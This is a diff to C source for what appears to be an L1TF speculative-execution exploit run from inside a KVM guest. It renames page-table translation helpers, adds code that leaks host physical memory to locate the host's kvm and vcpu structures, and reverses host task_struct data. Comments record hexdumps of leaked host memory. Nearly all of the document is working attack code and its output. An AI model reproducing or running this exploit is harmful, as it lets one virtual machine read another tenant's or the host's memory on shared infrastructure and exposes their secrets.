@@ -163,9 +163,9 @@ uintptr_t get_feeling_translate_gva(uintptr_t hl0_hpa, uintptr_t gl0_hpa, uintpt
 	return pa;
 }
 
-hpa_t leak_translation_double(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp);
+hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp);
 
-pte_t leak_pte_new(hpa_t base, hpa_t pa, hpa_t eptp)
+pte_t leak_pte(hpa_t base, hpa_t pa, hpa_t eptp)
 {
 	pte_t pte;
 	do {
@@ -179,7 +179,7 @@ pte_t leak_pte_new(hpa_t base, hpa_t pa, hpa_t eptp)
 		// `pte` is a guest PTE.
 		u64 flags = pte & ~PFN_MASK;
 		gpa_t ptep = pte & PFN_MASK;
-		hpa_t pfn = leak_translation_double(base, ptep, eptp, 0);
+		hpa_t pfn = leak_translation(base, ptep, eptp, 0);
 		pte = pfn | flags;
 	}
 
@@ -194,9 +194,9 @@ pte_t leak_pte_new(hpa_t base, hpa_t pa, hpa_t eptp)
  *
  * In all cases, we return `va`'s *host* physical address.
  */
-hpa_t leak_translation_double(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
+hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
 {
-	printf("leak_translation_double(base=%lx, va=%lx, cr3=%lx, eptp=%lx)\n", base, va, cr3, eptp);
+	printf("leak_translation(base=%lx, va=%lx, cr3=%lx, eptp=%lx)\n", base, va, cr3, eptp);
 	assert(base < HOST_MEMORY_SIZE);
 	assert(cr3 < HOST_MEMORY_SIZE && (cr3 & 0xfff) == 0);
 	assert(eptp < HOST_MEMORY_SIZE && (eptp & 0xfff) == 0);
@@ -205,14 +205,14 @@ hpa_t leak_translation_double(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
 	// Level 0 -- Page Global Directory.
 	hpa_t pgdp = page_table + 8 * BITS(va, 48, 39);
 	dump(pgdp);
-	pte_t pgd = leak_pte_new(base, pgdp, eptp);
+	pte_t pgd = leak_pte(base, pgdp, eptp);
 	dump(pgd);
 	page_table = pgd & PFN_MASK;
 
 	// Level 1 -- Page Upper Directory.
 	hpa_t pudp = page_table + 8 * BITS(va, 39, 30);
 	dump(pudp);
-	pte_t pud = leak_pte_new(base, pudp, eptp);
+	pte_t pud = leak_pte(base, pudp, eptp);
 	dump(pud);
 	if (IS_HUGE(pud)) {
 		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
@@ -224,7 +224,7 @@ hpa_t leak_translation_double(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
 	// Level 2 -- Page Middle Directory.
 	hpa_t pmdp = page_table + 8 * BITS(va, 30, 21);
 	dump(pmdp);
-	pte_t pmd = leak_pte_new(base, pmdp, eptp);
+	pte_t pmd = leak_pte(base, pmdp, eptp);
 	dump(pmd);
 	if (IS_HUGE(pmd)) {
 		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
@@ -236,7 +236,7 @@ hpa_t leak_translation_double(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
 	// Level 3 -- Page Table Entry.
 	hpa_t ptep = page_table + 8 * BITS(va, 21, 12);
 	dump(ptep);
-	pte_t pte = leak_pte_new(base, ptep, eptp);
+	pte_t pte = leak_pte(base, ptep, eptp);
 	dump(pte);
 	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
 	dump(pa);
@@ -251,23 +251,30 @@ u64 leak_u64(hpa_t base, hpa_t pa, int iters)
 	return data;
 }
 
+va_t leak_kvm_vcpu(hpa_t base, hpa_t kvm)
+{
+	va_t head = leak_u64(base, kvm + KVM_VCPU_ARRAY + 8, 7);
+	// TODO
+	return head;
+}
+
 void translator_exam(hpa_t base, hva_t direct_map, hpa_t eptp, hpa_t hcr3, hpa_t gcr3, gva_t text)
 {
 	gpa_t guest_cr3 = 0x189e3e001;
-	leak_translation_double(base, guest_cr3, eptp, 0);
+	leak_translation(base, guest_cr3, eptp, 0);
 	printf("correct gcr3's hpa = %lx\n", gcr3);
 
-	leak_translation_double(base, direct_map+0x12345678UL, hcr3, 0);
+	leak_translation(base, direct_map+0x12345678UL, hcr3, 0);
 	printf("correct pa = %lx\n", 0x12345678UL);
 
 	gva_t guest_direct_map = 0xffff94eb40000000;
 	gva_t the_va = guest_direct_map+0x12345678UL;
 	printf("gva_t %lx  ]-->  data %lx\n", the_va, procfs_get_data(the_va));
-	leak_translation_double(base, the_va, gcr3, eptp);
+	leak_translation(base, the_va, gcr3, eptp);
 
 	printf("@ %lx  --> data %lx\n", 0x12345678UL, leak_u64(base, 0x12345678, 5));
 
-	hpa_t pa = leak_translation_double(base, 0x12345678, eptp, 0);
+	hpa_t pa = leak_translation(base, 0x12345678, eptp, 0);
 	printf("@ %lx  --> data %lx\n", pa, leak_u64(base, pa, 5));
 }
 
@@ -714,7 +721,7 @@ void reverse_host_kernel_data_structures(void)
 	//   28:                 1   01 00 00 00 00 00 00 00 ........
 	//   30:      7ffffffff000   00 f0 ff ff ff 7f 00 00 ........
 	//   38:      7ffda0b1c000   00 c0 b1 a0 fd 7f 00 00 ........
-	//   40:  ffff934151cf6000   00 60 cf 51 41 93 ff ff .`.QA...
+	//   40:  ffff934151cf6000   00 60 cf 51 41 93 ff ff .`.QA... <-- pgd
 	//   48:                c2   c2 00 00 00 00 00 00 00 ........
 	//   50:                 0   00 00 00 00 00 00 00 00 ........
 	//   58:                 0   00 00 00 00 00 00 00 00 ........
@@ -965,7 +972,42 @@ void reverse_host_kernel_data_structures(void)
 
 	hpa_t hcr3 = pgd - direct_map;
 
-	translator_exam(base, direct_map, hpa, hcr3, cr3_hpa, text);
+	// translator_exam(base, direct_map, hpa, hcr3, cr3_hpa, text);
+
+	hva_t kvm = 0xffff9584f2d71000; // leak_u64(base, kvm_vcpu-direct_map, 1);
+	dump(kvm);
+	hpa_t kvm_pa = 0x13354d000; // leak_translation(base, kvm, hcr3, 0);
+	dump(kvm_pa);
+
+	char kvm_mid[0x250];
+	hpa_t kvm_start = kvm_pa + KVM_VCPU_ARRAY - sizeof(kvm_mid)/2;
+	for (int i = 0; i < 100; i++) {
+		printf("kvm_start, i.e. %lx: (i = %d)\n", kvm_start, i);
+		l1tf_leak(kvm_mid, base, kvm_start, sizeof(kvm_mid));
+		display(kvm_mid, sizeof(kvm_mid));
+	}
+	printf("\n");
+	// kvm_start, i.e. 13354e108: (i = 5)
+	//    0:                 0   00 00 00 00 00 00 00 00 ........
+	//    8:                 0   00 00 00 00 00 00 00 00 ........
+	//   10:                 0   00 00 00 00 00 00 00 00 ........
+	//   18:                 0   00 00 00 00 00 00 00 00 ........
+	//   20:                 0   00 00 00 00 00 00 00 00 ........
+	//   28:                 0   00 00 00 00 00 00 00 00 ........
+	//   30:                 0   00 00 00 00 00 00 00 00 ........
+	//   38:  ffff9341505455d0   d0 55 54 50 41 93 ff ff .UTPA...
+
+	
+	// hpa_t head = 0xffff93417354e000 - direct_map;
+	// dump(head);
+	// char head_buf[0x8];
+	// for (int i = 0; i < 100; i++) {
+	// 	printf("head, i.e. %lx: (i = %d)\n", head, i);
+	// 	l1tf_leak(head_buf, base, head, sizeof(head_buf));
+	// 	display(head_buf, sizeof(head_buf));
+	// }
+	// printf("\n");
+
 
 
 // =============================================================================
@@ -1020,6 +1062,46 @@ void reverse_host_kernel_data_structures(void)
 
 
 	// Leaked 0xc0 bytes at direct map adddress 0xffff9348e6de5e00, i.e. pa (0xffff9348e6de5e00-0xffff934040000000)
+}
+
+void old_comm_and_task_reversing(void)
+{
+
+	// char comm[16];
+	// // l1tf_leak(comm, base, pa(task_struct+OFF_COMM), 0x10);
+	// display(comm, 0x10);
+
+	// char tasks[0x40];
+	// l1tf_leak(tasks, base, pa(task_struct+TASK_TASKS-0x10), 0x40);
+	// display(tasks, 0x40);
+	//    0:                0 00 00 00 00 00 00 00 00 ........
+	//    8:    248be3fe15218 18 52 e1 3f be 48 02 00 .R.?.H..
+	//   10: ffffffff8501a440 40 a4 01 85 ff ff ff ff @.......
+	//   18: ffff93416c014a80 80 4a 01 6c 41 93 ff ff .J.lA...
+	//   20:        f0000008c 8c 00 00 00 0f 00 00 00 ........
+	//   28: ffff936a91dba918 18 a9 db 91 6a 93 ff ff ....j...
+	//   30: ffff936a91dba918 18 a9 db 91 6a 93 ff ff ....j...
+	//   38:  fff936091dba928 28 a9 db 91 60 93 ff 0f (...`...
+
+	// const int len_tasks_next = 0x20;
+	// char tasks_next[len_tasks_next];
+	// l1tf_leak_multi(tasks_next, base, pa(0xffff93416c014a80), len_tasks_next, 11);
+	// display(tasks_next, len_tasks_next);
+	//  0:  ffff934214810a40   40 0a 81 14 42 93 ff ff @...B...
+	//  8:  ffff93a1c66b2a80   80 2a 6b c6 a1 93 ff ff .*k.....
+	// 10:       f00000f008c   8c 00 0f 00 00 0f 00 00 ........
+	// 18:  ffff93416c014a98   98 4a 01 6c 41 93 ff ff .J.lA...
+
+	// char comm[16];
+	// l1tf_leak_multi(comm, base, pa(0xffff93416c014a80-TASK_TASKS+OFF_COMM), sizeof(comm), 11);
+	// display(comm, sizeof(comm));
+	//    0:  6961775f6b736174   74 61 73 6b 5f 77 61 69 task_wai
+	//    8:    7275650f726574   74 65 72 0f 65 75 72 00 ter.eur.
+
+	// const int len = 0xc0;
+	// char data[len];
+	// l1tf_leak(data, base, pa(0xffff93416c014a80-TASK_TASKS), len);
+	// display(data, len);
 }
 
 void reverse_nginx(void)
